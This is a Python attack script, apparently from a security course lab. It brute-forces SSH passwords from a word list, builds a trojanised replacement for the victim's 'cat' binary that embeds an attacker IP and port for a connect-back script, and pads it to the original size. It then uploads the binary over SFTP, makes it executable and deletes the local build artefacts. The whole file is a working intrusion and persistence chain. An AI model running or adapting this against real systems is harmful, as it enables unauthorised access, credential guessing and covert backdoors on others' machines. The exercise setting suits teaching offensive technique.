#!/usr/bin/env python3
from sys import argv
import paramiko
import itertools
import sys
import os


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, banner_timeout=500)
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        client.close()
        return False
    else:
        # connection was established successfully
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return client

def open_dat():
    txt = open("./materials/victim.dat")
    dictionary = []
    for line in txt.readlines():
        dictionary.append(line.strip("\n")) 

    return dictionary
    
def find_pwd(dictionary, vctip):
   
    for i in range(3):
        x = itertools.permutations(dictionary, i+2)
        for tt in list(x):
            temp_string = ""
            for yy in list(tt):
                temp_string += str(yy)
            if(temp_string != " " and temp_string !=""):
                client = is_ssh_open(vctip,"csc2022",temp_string)
                if(client != False):
                    return temp_string, client

def make_h_file(attacker_ip, attacker_port):
    # make connect_server.h
    os.system("xxd -i connect_server.sh > connect_server.h")
    # make address_port.h
    fptr = open("address_port.txt", "w")
    fptr.write(" " + attacker_ip + " " + attacker_port)
    fptr.close()
    os.system("xxd -i address_port.txt > address_port.h")
    # make cat.h and zip
    os.system('mv cat cat1')
    os.system('zip catz.zip cat1')
    os.system("xxd -i catz.zip > catz.h")
    os.system('mv cat1 cat')

def enlarge_cat():
    cat_size = 43416
    catz_size = os.path.getsize('new_cat')
    fptr = open('new_cat', 'a')
    remain_size = cat_size-catz_size-4
    dirty = ''
    for i in range(remain_size):
        dirty += '0'
    fptr.write(dirty)
    fptr.close()
    fptr = open('new_cat', 'ab')
    bb = bytes.fromhex("afbeadde")
    fptr.write(bb)
    fptr.close()


    
    

def delete_file():
    os.system("rm catz.zip")
    os.system("rm catz.h")
    os.system("rm new_cat")
    os.system("rm connect_server.h")
    os.system("rm address_port.txt")
    os.system("rm address_port.h")

def send_cat(client):
    sftp = client.open_sftp()
    sftp.put("./new_cat", "/home/csc2022/cat")
    client.exec_command('chmod +x /home/csc2022/cat')
    sftp.close()
    client.close()

if __name__ == '__main__':
    # 192.168.177.130 192.168.177.128 6000
    vctip = sys.argv[1]
    atkip = sys.argv[2]
    atkport = sys.argv[3]

    password, client = find_pwd(open_dat(), vctip)
    make_h_file(atkip, atkport)
    os.system("gcc 2.c -o new_cat")
    enlarge_cat()
    send_cat(client)
    # sftp = client.open_sftp()
    # sftp.put("./new_cat", "/home/csc2022/cat")
    # client.exec_command('chmod +x /home/csc2022/cat')
    # sftp.close()
    # client.close()
    delete_file()
    # os.system("rm catz.zip")
    # os.system("rm catz.h")
    # os.system("rm new_cat")
    # os.system("rm connect_server.h")
    # os.system("rm address_port.txt")
    # os.system("rm address_port.h")







